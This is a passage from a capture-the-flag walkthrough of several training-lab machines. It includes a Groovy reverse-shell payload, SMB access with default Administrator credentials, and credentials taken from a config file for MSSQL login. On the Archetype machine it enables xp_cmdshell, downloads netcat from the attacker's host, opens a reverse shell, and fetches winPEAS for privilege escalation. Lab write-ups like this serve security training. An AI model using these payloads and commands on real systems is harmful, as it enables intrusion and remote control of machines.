Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Re- running the script we notice in the terminal we have shell access!

```
ls

bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
```

```
cd root

ls
flag.txt
snap

cat flag.txt

9cdfb439c7876e703e307864c9167a15
```
We can now grab our thirteenth flag!

## Conclusions - Level 7 Pennyworth

| # | 	Tools 	| Description |
| :-----------: | :-----------: | :-----------: |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
| 2 | 	netcat  |    Netcat is a computer networking utility for reading from and writing to network connections using TCP or UDP. | 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
| 1 | 	Default/Weak Credentials   |    	X |  |  |  |

Using nmap, we were able to discover the host had a web server open on port 8080. We then we able to brute force the login credentials using the default Jenkins username/password. Finally, we were able to perform a reverse shell exploit using a groovy script inside the web console in order to get root access to the machine.
 
[Table of Contents](#table-of-contents) 



## Level 8: Tactics

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| :-----------: | :-----------: | :-----------: |
| 1 | 	IP Address   |    	10.129.56.216   | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.56.216

PING 10.129.56.216 (10.129.56.216) 56(84) bytes of data.
64 bytes from 10.129.56.216: icmp_seq=1 ttl=127 time=11.4 ms
64 bytes from 10.129.56.216: icmp_seq=2 ttl=127 time=9.99 ms
64 bytes from 10.129.56.216: icmp_seq=3 ttl=127 time=8.61 ms
64 bytes from 10.129.56.216: icmp_seq=4 ttl=127 time=7.48 ms

--- 10.129.56.216 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 7.480/9.374/11.413/1.475 ms

```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: probe open ports to determine service/version info
-O: operating system information
```
The results of nmap are:

```
└─$ sudo nmap -p- --min-rate 3000 -sC -sV -O  10.129.56.216

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-27 15:16 EDT
Nmap scan report for 10.129.56.216
Host is up (0.0094s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2022-07-27T19:17:07
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.99 seconds

```
Our scan shows quite a few ports the can be explored. One of the more interesting ones is port ```445```, which is reserved for Sever Message Block (SMB) as we have seen in a previous box.

We can start by trying to establish connection using smbclient:

```
smbclient -L {ip address}
```
 
The results of using smbclient are:

```
└─$ smbclient -L 10.129.56.216 
                       
Password for [WORKGROUP\kali]:
session setup failed: NT_STATUS_ACCESS_DENIED


```
Unfortunately, this failed. We can try to see if there is an Administrator credential:

```
└─$ smbclient -L 10.129.56.216 -U 'Administrator'

Password for [WORKGROUP\Administrator]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.56.216 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```
We can see here all of the visible share names listed. A great starting point is to try to connect with each of these shares.

Starting with ```ADMIN$```:

```
└─$ smbclient \\\\10.129.56.216\\ADMIN$ -U 'Administrator'

Password for [WORKGROUP\Administrator]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 27 15:46:28 2022
  ..                                  D        0  Wed Jul 27 15:46:28 2022
  $Reconfig$                          D        0  Mon Sep 20 12:02:49 2021
  ADFS                                D        0  Sat Sep 15 03:19:03 2018
  appcompat                           D        0  Sat Sep 15 03:19:00 2018
  apppatch                            D        0  Mon Oct 29 18:39:47 2018
  AppReadiness                        D        0  Wed Apr 21 11:39:36 2021
  assembly                           DR        0  Sat Sep 15 05:09:13 2018
  bcastdvr                            D        0  Sat Sep 15 03:19:00 2018
  bfsvc.exe                           A    78848  Sat Sep 15 03:12:58 2018
  Boot                                D        0  Sat Sep 15 03:19:01 2018
  bootstat.dat                       AS    67584  Wed Jul 27 15:05:35 2022
  Branding                            D        0  Sat Sep 15 03:19:01 2018
  CbsTemp                             D        0  Wed Jul  7 14:00:03 2021
  Containers                          D        0  Sat Sep 15 03:19:01 2018
  Cursors                             D        0  Sat Sep 15 03:19:04 2018
  debug                               D        0  Wed Apr 21 11:17:15 2021
  diagnostics                         D        0  Sat Sep 15 03:19:01 2018
  DigitalLocker                       D        0  Sat Sep 15 05:05:40 2018
  Downloaded Program Files           DS        0  Sat Sep 15 03:19:04 2018
  drivers                             D        0  Sat Sep 15 03:19:01 2018
  DtcInstall.log                      A     1947  Wed Apr 21 11:16:44 2021
  ELAMBKUP                           DH        0  Sat Sep 15 03:19:04 2018
  en-US                               D        0  Sat Sep 15 05:05:40 2018
  explorer.exe                        A  4245280  Mon Oct 29 18:39:24 2018
  Fonts                             DSR        0  Sat Sep 15 03:19:04 2018
  Globalization                       D        0  Sat Sep 15 03:19:01 2018
  Help                                D        0  Sat Sep 15 05:05:40 2018
  HelpPane.exe                        A  1065472  Sat Sep 15 03:12:46 2018
  hh.exe                              A    18432  Sat Sep 15 03:12:48 2018
  IdentityCRL                         D        0  Sat Sep 15 03:19:04 2018
  IME                                 D        0  Sat Sep 15 05:05:40 2018
  ImmersiveControlPanel              DR        0  Wed Apr 21 11:16:42 2021
  INF                                 D        0  Wed Jul 27 14:59:14 2022
  InputMethod                         D        0  Sat Sep 15 03:19:01 2018
  Installer                         DHS        0  Wed Jul  7 14:05:00 2021
  L2Schemas                           D        0  Sat Sep 15 03:19:04 2018
  LiveKernelReports                   D        0  Sat Sep 15 03:19:01 2018
  Logs                                D        0  Tue Sep 21 12:33:25 2021
  lsasetup.log                        A     1380  Wed Apr 21 11:16:02 2021
  media                             DSR        0  Sat Sep 15 03:19:04 2018
  mib.bin                             A    43131  Sat Sep 15 03:12:40 2018
  Microsoft.NET                      DR        0  Wed Jul 27 15:05:14 2022
  Migration                           D        0  Sat Sep 15 03:19:01 2018
  ModemLogs                           D        0  Sat Sep 15 03:19:01 2018
  notepad.exe                         A   254464  Sat Sep 15 03:12:38 2018
  OCR                                 D        0  Sat Sep 15 05:07:04 2018
  Offline Web Pages                  DR        0  Sat Sep 15 03:19:05 2018
  Panther                             D        0  Wed Apr 21 11:16:50 2021
  Performance                         D        0  Sat Sep 15 03:19:01 2018
  PFRO.log                            A     1708  Mon Sep 27 06:26:45 2021
  PLA                                 D        0  Sat Sep 15 03:19:01 2018
  PolicyDefinitions                   D        0  Sat Sep 15 05:08:05 2018
  Prefetch                           Dn        0  Wed Apr 21 11:16:20 2021
  PrintDialog                        DR        0  Wed Apr 21 11:16:43 2021
  Provisioning                        D        0  Sat Sep 15 03:19:01 2018
  regedit.exe                         A   358400  Sat Sep 15 03:12:52 2018
  Registration                        D        0  Wed Jul 27 14:55:07 2022
  RemotePackages                      D        0  Sat Sep 15 03:19:01 2018
  rescache                            D        0  Sat Sep 15 03:19:01 2018
  Resources                           D        0  Sat Sep 15 03:19:01 2018
  SchCache                            D        0  Sat Sep 15 03:19:01 2018
  schemas                             D        0  Sat Sep 15 03:19:01 2018
  security                            D        0  Sat Sep 15 03:19:01 2018
  ServerStandard.xml                  A    30931  Sat Sep 15 03:13:27 2018
  ServiceProfiles                     D        0  Wed Apr 21 11:16:04 2021
  ServiceState                        D        0  Sat Sep 15 03:19:01 2018
  servicing                           D        0  Sat Sep 15 05:06:36 2018
  Setup                               D        0  Sat Sep 15 03:21:38 2018
  ShellComponents                     D        0  Sat Sep 15 03:19:05 2018
  ShellExperiences                    D        0  Sat Sep 15 03:19:05 2018
  SKB                                 D        0  Sat Sep 15 03:19:01 2018
  SoftwareDistribution                D        0  Wed Apr 21 11:23:54 2021
  Speech                              D        0  Sat Sep 15 03:19:01 2018
  Speech_OneCore                      D        0  Sat Sep 15 03:19:01 2018
  splwow64.exe                        A   132096  Sat Sep 15 03:13:30 2018
  System                              D        0  Sat Sep 15 03:19:01 2018
  system.ini                          A      219  Sat Sep 15 03:16:48 2018
  System32                            D        0  Wed Jul 27 14:59:14 2022
  SystemApps                          D        0  Sat Sep 15 03:19:01 2018
  SystemResources                     D        0  Sat Sep 15 03:19:01 2018
  SysWOW64                            D        0  Wed Jul  7 14:04:43 2021
  TAPI                                D        0  Tue Sep 21 12:51:49 2021
  Tasks                               D        0  Wed Apr 21 11:16:18 2021
  Temp                                D        0  Wed Jul 27 15:46:28 2022
  TextInput                           D        0  Sat Sep 15 03:19:14 2018
  tracing                             D        0  Sat Sep 15 03:19:01 2018
  twain_32                            D        0  Sat Sep 15 03:19:14 2018
  twain_32.dll                        A    64512  Sat Sep 15 03:13:11 2018
  Vss                                 D        0  Sat Sep 15 03:19:01 2018
  WaaS                                D        0  Sat Sep 15 03:19:01 2018
  Web                                 D        0  Sat Sep 15 03:19:01 2018
  win.ini                             A       92  Sat Sep 15 03:16:48 2018
  WindowsShell.Manifest             AHR      670  Sat Sep 15 03:12:40 2018
  WindowsUpdate.log                   A      276  Wed Jul 27 14:55:14 2022
  winhlp32.exe                        A    11776  Sat Sep 15 03:13:11 2018
  WinSxS                              D        0  Wed Jul  7 13:46:29 2021
  WMSysPr9.prx                        A   316640  Sat Sep 15 03:12:02 2018
  write.exe                           A    11264  Sat Sep 15 03:12:55 2018

                3774463 blocks of size 4096. 1159050 blocks available
smb: \> 


```
We see here mostly system files, however no flag is found.

Trying the remaining shares:

```
└─$ smbclient \\\\10.129.56.216\\C$ -U 'Administrator'

Password for [WORKGROUP\Administrator]:
Try "help" to get a list of possible commands.
smb: \> dir
  $Recycle.Bin                      DHS        0  Wed Apr 21 11:23:49 2021
  Config.Msi                        DHS        0  Wed Jul  7 14:04:56 2021
  Documents and Settings          DHSrn        0  Wed Apr 21 11:17:12 2021
  pagefile.sys                      AHS 738197504  Wed Jul 27 14:55:02 2022
  PerfLogs                            D        0  Sat Sep 15 03:19:00 2018
  Program Files                      DR        0  Wed Jul  7 14:04:24 2021
  Program Files (x86)                 D        0  Wed Jul  7 14:03:38 2021
  ProgramData                        DH        0  Wed Apr 21 11:31:48 2021
  Recovery                         DHSn        0  Wed Apr 21 11:17:15 2021
  System Volume Information         DHS        0  Wed Apr 21 11:34:04 2021
  Users                              DR        0  Wed Apr 21 11:23:18 2021
  Windows                             D        0  Wed Jul 27 15:46:28 2022

                3774463 blocks of size 4096. 1159034 blocks available
smb: \> 

```

We can try to browse the local directory.

```
└smb: \> cd Users

smb: \Users\> ls
  .                                  DR        0  Wed Apr 21 11:23:18 2021
  ..                                 DR        0  Wed Apr 21 11:23:18 2021
  Administrator                       D        0  Wed Apr 21 11:23:32 2021
  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
  Default                           DHR        0  Wed Apr 21 11:17:12 2021
  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
  Public                             DR        0  Wed Apr 21 11:23:31 2021

                3774463 blocks of size 4096. 1159034 blocks available

smb: \Users\> cd Administrator

smb: \Users\Administrator\> ls
  .                                   D        0  Wed Apr 21 11:23:32 2021
  ..                                  D        0  Wed Apr 21 11:23:32 2021
  3D Objects                         DR        0  Wed Apr 21 11:23:31 2021
  AppData                            DH        0  Wed Apr 21 11:23:19 2021
  Application Data                DHSrn        0  Wed Apr 21 11:23:19 2021
  Contacts                           DR        0  Wed Apr 21 11:23:31 2021
  Cookies                         DHSrn        0  Wed Apr 21 11:23:19 2021
  Desktop                            DR        0  Thu Apr 22 03:16:03 2021
  Documents                          DR        0  Wed Apr 21 11:23:32 2021
  Downloads                          DR        0  Wed Jul  7 13:44:36 2021
  Favorites                          DR        0  Wed Apr 21 11:23:31 2021
  Links                              DR        0  Wed Apr 21 11:23:32 2021
  Local Settings                  DHSrn        0  Wed Apr 21 11:23:19 2021
  Music                              DR        0  Wed Apr 21 11:23:32 2021
  My Documents                    DHSrn        0  Wed Apr 21 11:23:19 2021
  NetHood                         DHSrn        0  Wed Apr 21 11:23:19 2021
  NTUSER.DAT                        AHn   786432  Mon Sep 27 06:38:14 2021
  ntuser.dat.LOG1                   AHS   238592  Wed Apr 21 11:23:18 2021
  ntuser.dat.LOG2                   AHS    98304  Wed Apr 21 11:23:18 2021
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf    AHS    65536  Wed Apr 21 05:03:39 2021
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Wed Apr 21 11:23:19 2021
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Wed Apr 21 11:23:19 2021
  ntuser.ini                         HS       20  Wed Apr 21 11:23:19 2021
  Pictures                           DR        0  Wed Apr 21 11:23:31 2021
  PrintHood                       DHSrn        0  Wed Apr 21 11:23:19 2021
  Recent                          DHSrn        0  Wed Apr 21 11:23:19 2021
  Saved Games                        DR        0  Wed Apr 21 11:23:32 2021
  Searches                           DR        0  Wed Apr 21 11:23:32 2021
  SendTo                          DHSrn        0  Wed Apr 21 11:23:19 2021
  Start Menu                      DHSrn        0  Wed Apr 21 11:23:19 2021
  Templates                       DHSrn        0  Wed Apr 21 11:23:19 2021
  Videos                             DR        0  Wed Apr 21 11:23:31 2021

                3774463 blocks of size 4096. 1159018 blocks available
smb: \Users\Administrator\> cd Desktop
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Thu Apr 22 03:16:03 2021
  ..                                 DR        0  Thu Apr 22 03:16:03 2021
  desktop.ini                       AHS      282  Wed Apr 21 11:23:32 2021
  flag.txt                            A       32  Fri Apr 23 05:39:00 2021

                3774463 blocks of size 4096. 1159002 blocks available

```

We can see here were found our fourteenth flag!

Here we can first download, then open it.

```
smb: \Users\Administrator\Desktop\> get flag.txt

getting file \Users\Administrator\Desktop\flag.txt of size 32 as flag.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)

└─$ cat flag.txt               
f751c19eda8f61ce81827e6930a1f40c  

```
## Conclusions - Level 8 Tactics

| # | 	Tools 	| Description |
| :-----------: | :-----------: | :-----------: |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
| 1 | 	Default/Weak Credentials   |    	X |  |  |  |

Using nmap, we were able to discover the host was running an SMB on port 445. Logging in, we were then able to get access to the service, a consequence of the server administrator having poorly configured the login credentials.


[Table of Contents](#table-of-contents)

# Tier 2

## Level 1: Archtype

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| :-----------: | :-----------: | :-----------: |
| 1 | 	IP Address   |    	10.129.95.187   | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.95.187      
        
PING 10.129.95.187 (10.129.95.187) 56(84) bytes of data.
64 bytes from 10.129.95.187: icmp_seq=1 ttl=127 time=13.0 ms
64 bytes from 10.129.95.187: icmp_seq=2 ttl=127 time=9.99 ms
64 bytes from 10.129.95.187: icmp_seq=3 ttl=127 time=8.31 ms
64 bytes from 10.129.95.187: icmp_seq=4 ttl=127 time=6.77 ms

--- 10.129.95.187 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 6.773/9.510/12.973/2.300 ms


```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: probe open ports to determine service/version info
-O: operating system information
```
The results of nmap are:

```
└─$ sudo nmap -p- --min-rate 3000 -sC -sV -O  10.129.95.187

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-28 16:52 EDT
Nmap scan report for 10.129.95.187
Host is up (0.0092s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ssl-date: 2022-07-28T20:54:15+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-07-28T20:50:02
|_Not valid after:  2052-07-28T20:50:02
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/28%OT=135%CT=1%CU=43192%PV=Y%DS=2%DC=I%G=Y%TM=62E2F7
OS:77%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS
OS:=U)OPS(O1=M539NW8NNS%O2=M539NW8NNS%O3=M539NW8%O4=M539NW8NNS%O5=M539NW8NN
OS:S%O6=M539NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y
OS:%DF=Y%T=80%W=FFFF%O=M539NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD
OS:=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%
OS:S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD
OS:=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-07-28T13:54:07-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| ms-sql-info: 
|   10.129.95.187:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-time: 
|   date: 2022-07-28T20:54:10
|_  start_date: N/A
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.15 seconds


```
Our scan shows quite a few ports the can be explored. The more interesting ones here are port 445 (SMB) and 1433 (MYSQL DB)

We can start by trying to establish connection using smbclient:

```
smbclient -L {ip address}
```
 
The results of using smbclient are:

```
└─$ smbclient -L 10.129.95.187   
       
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.95.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```
We can see here all of the visible share names listed. A great starting point is to try to connect with each of these shares.

In analyzing each share, we notice that backups does not require administrative privileges. This would be a great first option:


```
└─$ smbclient \\\\10.129.95.187\\backups

Password for [WORKGROUP\kali]:

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                5056511 blocks of size 4096. 2602932 blocks available
smb: \> 

```
Gaining access, we notice one file of interest, ```prod.dtsConfig```. We can start by downloading and analyzing it:

```
smb: \> get prod.dtsConfig

getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)

└─$ cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>  

```

In scanning the file, we notice two bits of important information:

```
User ID= ARCHETYPE\sql_svc
Password= M3g4c0rp123
```
We can save these credentials for now, as they may come in handy later on.

Since we have exhausted our options with the SMB share, we can try using out credentials to log into the MYSQL database. We can use thee mssqlclient.py script to make a connection:

```
└─$ python /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands

SQL> 

```
We can see here the credentials we found earlier were a success into gaining DB access. We can see our options:

```
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     
SQL> 


```
It would be a great idea to use a command shell, we can get access to the system. First enabling it:

```
SQL> enable_xp_cmdshell

[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL> RECONFIGURE

```
Now, let's run the shell:

```
SQL> xp_cmdshell whoami
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL                                                                               

SQL> 
```
We can see two things here:

 1. We do not have root access
 2. The command shell is not persistent so we would need to chain commands to be able to do anything useful

One idea is to install netcat on this remote machine in order to get access to a reverse shell persistent terminal. 

First, let's run host a python server on our machine:

```
└─$ sudo python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Next, let's jump back to our SQL terminal and download the netcat executable from our machine:

```
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.136/nc64.exe -outfile nc64.exe"

output                                                                             

--------------------------------------------------------------------------------   

NULL 
 

10.129.95.187 - - [28/Jul/2022 17:40:48] "GET /nc64.exe HTTP/1.1" 200 -
```

Since it successfully downloaded, let's run the executable after we start netcat on out host machine:

```
└─$ sudo nc -lvnp 443

listening on [any] 443 ...

```

```
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; ./nc64.exe -e cmd.exe 10.10.14.136 443"
```

```
connect to [10.10.14.136] from (UNKNOWN) [10.129.95.187] 49678
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\sql_svc\Downloads>
```
It worked! We now have full console access with user privileges.

We can browse around to see if there are any flags for this user.

```
C:\Users\sql_svc\Downloads>cd ..
cd ..

C:\Users\sql_svc>dir

 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\sql_svc

01/20/2020  06:01 AM    <DIR>          .
01/20/2020  06:01 AM    <DIR>          ..
01/20/2020  06:01 AM    <DIR>          3D Objects
01/20/2020  06:01 AM    <DIR>          Contacts
01/20/2020  06:42 AM    <DIR>          Desktop
01/20/2020  06:01 AM    <DIR>          Documents
07/28/2022  02:40 PM    <DIR>          Downloads
01/20/2020  06:01 AM    <DIR>          Favorites
01/20/2020  06:01 AM    <DIR>          Links
01/20/2020  06:01 AM    <DIR>          Music
01/20/2020  06:01 AM    <DIR>          Pictures
01/20/2020  06:01 AM    <DIR>          Saved Games
01/20/2020  06:01 AM    <DIR>          Searches
01/20/2020  06:01 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  10,710,724,608 bytes free

C:\Users\sql_svc>cd desktop

C:\Users\sql_svc\Desktop>dir

 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\sql_svc\Desktop

01/20/2020  06:42 AM    <DIR>          .
01/20/2020  06:42 AM    <DIR>          ..
02/25/2020  07:37 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,710,724,608 bytes free

C:\Users\sql_svc\Desktop>type user.txt

type user.txt

3e7b102e78218e935bf3f4951fec21a3

```
We cam see here we have our fifteenth flag! This level makes it clear that there is another flag to grab. 

We can try to perform a Windows privilege escalation in order to access the other flag.

One tool we could use is winPEAS. Since we still have our python server running, lets pass the exe over to the host machine to run:

```
C:\Users\sql_svc\Desktop>powershell

Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\sql_svc\Desktop> wget http://10.10.14.136/winPEASany_ofs.exe -outfile winPEASany_ofs.exe
wget http://10.10.14.136/winPEASany_ofs.exe -outfile winPEASany_ofs.exe

PS C:\Users\sql_svc\Desktop> ls

    Directory: C:\Users\sql_svc\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        2/25/2020   6:37 AM             32 user.txt                                                              
-a----        7/28/2022   3:00 PM        1804288 winPEASany_ofs.exe                                                    

PS C:\Users\sql_svc\Desktop> ./winPEASany_ofs.exe 
```
We see an interesting file:

```
PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS history size: 79B

type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

